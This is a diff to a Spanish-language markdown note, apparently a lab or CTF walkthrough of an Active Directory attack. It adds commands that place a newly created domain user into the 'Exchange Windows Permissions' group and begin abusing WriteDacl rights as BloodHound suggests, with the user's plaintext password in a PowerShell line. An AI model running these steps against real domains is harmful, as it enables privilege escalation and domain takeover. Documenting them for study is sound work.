@@ -183,8 +183,14 @@ net user jaime jaime123! /add /domain
 
 Añadimos al usuario al grupo
 ```shell
-
+net group "Exchange Windows Permissions" jaime /add
 ```
+
+Una vez con el usuario añadido al grupo seguiremos los pasos que nos muestran [[BLOODHOUND]] para abusar de `Write Dacl`
+```shell
+$SecPassword = ConvertTo-SecureString 'jaime123!' -AsPlainText -Force
+```
+
 
 
 
